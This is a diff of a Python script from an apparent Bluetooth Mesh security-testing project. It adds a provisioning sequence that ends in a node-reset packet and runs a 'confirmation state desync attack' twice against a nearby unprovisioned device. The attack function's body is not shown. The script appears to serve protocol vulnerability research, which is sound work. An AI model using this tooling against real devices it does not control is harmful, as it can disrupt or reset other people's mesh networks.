@@ -3,14 +3,19 @@ import os
 import random
 import time
 
-sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__)))+"/../")
-sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))) + "/libs/")
-sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))) + "/libs/boofuzz/")
+# 脚本在 Test_Case/NRF/：项目根为 BLE_Mesh 的父目录（以便 import BLE_Mesh.*）
+_BASE = os.path.dirname(os.path.abspath(__file__))
+_BLE_MESH_ROOT = os.path.abspath(os.path.join(_BASE, "..", ".."))
+_PROJECT_ROOT = os.path.abspath(os.path.join(_BASE, "..", "..", ".."))
+sys.path.insert(0, _PROJECT_ROOT)
+sys.path.insert(0, os.path.join(_BLE_MESH_ROOT, "libs"))
+sys.path.insert(0, os.path.join(_BLE_MESH_ROOT, "libs", "boofuzz"))
+
 
 from colorama import Fore
-from Transfer.Send_Packet.BluetoothMesh_SUL import BluetoothMesh_SUL
-from Transfer.Config.Zerphy import config
-from Transfer.libs.driver.NRF52_dongle import NRF52Dongle
+from BLE_Mesh.Send_Packet.BluetoothMesh_SUL import BluetoothMesh_SUL
+from BLE_Mesh.Config.Zerphy import config
+from BLE_Mesh.libs.driver.NRF52_dongle import NRF52Dongle
 # from scapy.utils import hexdump
 
 
@@ -89,41 +94,105 @@ def confirmation_state_desync_attack(blemesh_sul):
     except Exception as e:
         print(Fore.RED + f"✗ exception: {str(e)}")
 
+def provision_process(blemesh_sul):
+    pkt = blemesh_sul.get_pkt("link_open_message_pkt")
+
+    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
+
+    pkt = blemesh_sul.get_pkt("provisioning_invite_pkt")
+
+    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
+
+    pkt = blemesh_sul.get_pkt("transaction_acknowledgment_pkt")
+    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
+
+    pkt = blemesh_sul.get_pkt("provisioning_start_pkt")
+    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
+
+    p = blemesh_sul.get_pkt("provisioning_public_key_pkt")
+    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=p)
+
+    pkt = blemesh_sul.get_pkt("transaction_acknowledgment_pkt")
+    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
+
+    pkt = blemesh_sul.get_pkt("provisioning_confirmation_pkt")
+    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
+
+    pkt = blemesh_sul.get_pkt("transaction_acknowledgment_pkt")
+    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
+
+    pkt = blemesh_sul.get_pkt("provisioning_random_pkt")
+    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
+
+    pkt = blemesh_sul.get_pkt("transaction_acknowledgment_pkt")
+    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
+
+    pkt = blemesh_sul.get_pkt("provisioning_data_pkt")
+    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
+
+    pkt = blemesh_sul.get_pkt("transaction_acknowledgment_pkt")
+    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
+
+    pkt = blemesh_sul.get_pkt("link_close_message_pkt")
+    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
+
+    pkt = blemesh_sul.get_pkt("config_composition_data_get_pkt")
+    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
+
+    pkt = blemesh_sul.get_pkt("config_node_reset_pkt")
+    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
 
 
 
-# 主程序
-blemesh_sul = BluetoothMesh_SUL(NRF52Dongle(port_name=port_name, logs_pcap=logs_pcap, pcap_filename=pcap_filename),
-                                unprovisioned_device_address,
-                                iat=iat,
-                                rat=rat,
-                                role=role,
-                                rx_len=rx_len,
-                                tx_len=tx_len,
-                                logger_handle=logger_handle,
-                                key_path=key_path,
-                                algorithm=algorithm)
 
-device_state = blemesh_sul.pre()
+if __name__ == "__main__":
+    blemesh_sul = BluetoothMesh_SUL(NRF52Dongle(port_name=port_name, logs_pcap=logs_pcap, pcap_filename=pcap_filename),
+                                    unprovisioned_device_address,
+                                    iat=iat,
+                                    rat=rat,
+                                    role=role,
+                                    rx_len=rx_len,
+                                    tx_len=tx_len,
+                                    logger_handle=logger_handle,
+                                    key_path=key_path,
+                                    algorithm=algorithm)
 
-print(device_state)
+    device_state = blemesh_sul.pre()
 
-if device_state == "unprovisioned_device_beacon_pkt":
-    print(Fore.GREEN + "Device found, starting state desync attack")
-    receive_pkt = ""
-    while "Link_ACK_Message" not in receive_pkt:        
-        pkt = blemesh_sul.get_pkt("link_open_message_pkt")
-        receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
-        print(receive_pkt)
-    print(Fore.GREEN + "Link_ACK_Message received")
-    confirmation_state_desync_attack(blemesh_sul)
-elif device_state == "secure_network_beacon_pkt":
-    print(Fore.GREEN + "Device found, already in secure network")
-    print(Fore.YELLOW + "State desync attack requires unprovisioned device")
-else:
-    print(Fore.YELLOW + "Device state unknown, attempting attack anyway...")
-    confirmation_state_desync_attack(blemesh_sul)
+    print(device_state)
 
-# blemesh_sul.post()
+    if device_state == "unprovisioned_device_beacon_pkt":
+        print(Fore.GREEN + "Device found, starting state desync attack")
+        receive_pkt = ""
+        while "Link_ACK_Message" not in receive_pkt:        
+            pkt = blemesh_sul.get_pkt("link_open_message_pkt")
+            receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
+            print(receive_pkt)
+        print(Fore.GREEN + "Link_ACK_Message received")
+        confirmation_state_desync_attack(blemesh_sul)
+    elif device_state == "secure_network_beacon_pkt":
+        print(Fore.GREEN + "Device found, already in secure network")
+        print(Fore.YELLOW + "State desync attack requires unprovisioned device")
+    else:
+        print(Fore.YELLOW + "Device state unknown, attempting attack anyway...")
+        confirmation_state_desync_attack(blemesh_sul)
 
+    time.sleep(50)
+    device_state = blemesh_sul.pre()
 
+    print(device_state)
+    if device_state == "unprovisioned_device_beacon_pkt":
+        print(Fore.GREEN + "Device found, starting state desync attack")
+        receive_pkt = ""
+        while "Link_ACK_Message" not in receive_pkt:        
+            pkt = blemesh_sul.get_pkt("link_open_message_pkt")
+            receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
+            print(receive_pkt)
+        print(Fore.GREEN + "Link_ACK_Message received")
+        confirmation_state_desync_attack(blemesh_sul)
+    elif device_state == "secure_network_beacon_pkt":
+        print(Fore.GREEN + "Device found, already in secure network")
+        print(Fore.YELLOW + "State desync attack requires unprovisioned device")
+    else:
+        print(Fore.YELLOW + "Device state unknown, attempting attack anyway...")
+        confirmation_state_desync_attack(blemesh_sul)
